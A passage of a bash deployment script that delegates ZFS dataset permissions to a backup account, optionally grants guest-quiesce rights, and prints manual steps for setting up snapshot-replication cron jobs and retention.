    log "Phase 8g: ZFS delegation on ${DATASETS[*]}"
    # ------------------------------------------------------------------------------
    # ZFS_PERMS is defined once in the config block at the top -- see the note
    # there about 'bookmark' and the 'delegation-verbs' contract.
    GRANTED_COUNT=0
    for ds in "${DATASETS[@]}"; do
        if ! zfs list -H -o name -- "$ds" >/dev/null 2>&1; then
            warn "dataset $ds does not exist on this host -- skipping (create it first, then: zfs allow -u $USERNAME $ZFS_PERMS $ds)"
            continue
        fi
        zfs allow -u "$USERNAME" "$ZFS_PERMS" "$ds" || die "zfs allow failed for $ds"
        GRANTED_COUNT=$((GRANTED_COUNT+1))
        log "delegated on $ds:"
        zfs allow "$ds" | grep "$USERNAME" || true
    done
    # Basket A1's real sting was not the separator, it was the OUTCOME: a list
    # whose every item missed produced an account with zero delegations and
    # exit 0 -- a run that says "done" while the account cannot touch a single
    # dataset. Skipping ONE bad name among good ones stays a warning (that is
    # a real workflow: grant now, create the dataset later). All of them
    # missing is not a partial success, it is the request not happening.
    if [ "${#DATASETS[@]}" -gt 0 ] && [ "$GRANTED_COUNT" -eq 0 ]; then
        die "none of the ${#DATASETS[@]} requested dataset(s) exist on this host, so '$USERNAME' was granted NOTHING. The account exists but cannot touch a single dataset -- that is this run failing, not succeeding. Check the names (zfs list -H -o name) and re-run."
    fi

    # ------------------------------------------------------------------------------
    log "Phase 8h: guest quiesce grant"
    # ------------------------------------------------------------------------------
    # The local counterpart of `--join --allow-quiesce`. A managed block that
    # carries `quiesce = auto` needs one capability that no `zfs allow` can
    # provide: freezing the guest whose disk is being snapshotted. Root has it
    # implicitly, a delegated account has it only through the helper -- so a
    # block moving from root to an account loses it silently unless it is
    # granted first, and lib-zfs-snap.sh then refuses (exit 3) every night.
    #
    # SAME dataset list as Phase 8g above, deliberately: the whitelist decides
    # which guests may be frozen, and deriving it from the replication scope is
    # what keeps "may freeze" from outgrowing "may replicate". Passing a PARENT
    # here is therefore a real widening -- every guest with a disk anywhere
    # under it becomes freezable -- which is why --datasets should name what the
    # config names.
    #
    # Opt-in, and never revoked implicitly: a bare re-run of deploy.sh leaves an
    # existing grant exactly as it found it. Removing one is --revoke-quiesce,
    # a separate deliberate act.
    if [ "$ALLOW_QUIESCE" -eq 1 ]; then
        install_quiesce_grant "$USERNAME" "$BACKUP_USER_DATASETS"
    elif [ -f "/etc/zfs-quiesce-allow/$USERNAME" ]; then
        log "guest quiesce already granted to $USERNAME (left untouched; --revoke-quiesce=$USERNAME removes it)"
    else
        log "guest quiesce NOT granted to $USERNAME -- a managed block using 'quiesce = auto' would fail with exit 3 as this account. Re-run with --allow-quiesce if it should be able to freeze guests here."
    fi

    echo
    log "===================================================================="
fi


# In check-only mode the exit code IS the result -- 0 means this host is ready,
# non-zero means something above needs attention. The full deploy path keeps
# returning 0 on warnings, because there the warnings are advisory and the work
# has already been done.
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ "$PROBLEMS" -gt 0 ]; then
        warn "audit found $PROBLEMS issue(s) on $(hostname -s 2>/dev/null || hostname)"
        exit 1
    fi
    log "audit clean on $(hostname -s 2>/dev/null || hostname)"
    exit 0
fi
echo
log "===================================================================="
log "Automated part done. Manual steps remaining (Part 5, NOT scripted):"
log "===================================================================="
cat <<'EOF'

  1. Add the actual snapsend.sh / snapget.sh / delsnaps.sh cron lines for
     THIS host's datasets. There is no generic template here on purpose --
     copying another host's dataset names blindly is how backups silently
     stop protecting the right data. Prefer writing a config and letting
     gen-cron.sh render the lines -- it lints what these hand-written
     shapes cannot. If writing by hand anyway:

       <schedule> /root/scripts/zfs-snapshot-all/snapsend.sh -m <prefix> \
         [-e] [-r|-R] [-u] [-z] -v 3 <DATASETS> [<REMOTE>] \
         2>>/root/scripts/cron.log || /root/scripts/notify-fail.sh "<short job name>"

     For delsnaps.sh (retention): its -v is a bare TOGGLE, not '-v 3' --
     the engines' -v takes a level, delsnaps' does not, and '-v 3' there
     makes '3' the dataset list (basket B7; the two parsers are frozen).
     Use -R when subtree retention is wanted, and a specific enough pattern
     (e.g. automated_hourly, not just automated_) unless a flat/blanket
     retention is genuinely what you want. Always give explicit retention
     flags: delsnaps with NO retention flags defaults to age-mode with
     threshold=now, which deletes everything the pattern matches.

  2. Before adding a new schedule, sanity-check it against what's ALREADY
     in crontab -l on this host -- specifically watch for jobs that can
     legitimately overrun into the next scheduled slot for a DIFFERENT job
     touching related data (this is what caused the original silent
     backup-gap bug and the near-miss on hdd/lxc weekly snapshots). The
     per-target flock lock (added 2026-07-07) protects against two
     invocations of the SAME target colliding, but does not protect two
     DIFFERENT jobs from stepping on each other's dataset lifecycle
     (e.g. a pruning job racing a send job on the same dataset).

  3. After adding cron lines, verify with a manual dry-run first:
       ./snapsend.sh -n <DATASETS> [<REMOTE>]   # -n = read-only, no side effects
     and only then let cron pick it up.

  4. If mail alerting (Part 4 above) needs a relay because direct postfix
     delivery didn't work: that requires host-specific SMTP credentials and
     is a decision for a human, not this script -- see the notes it printed
     above.

EOF
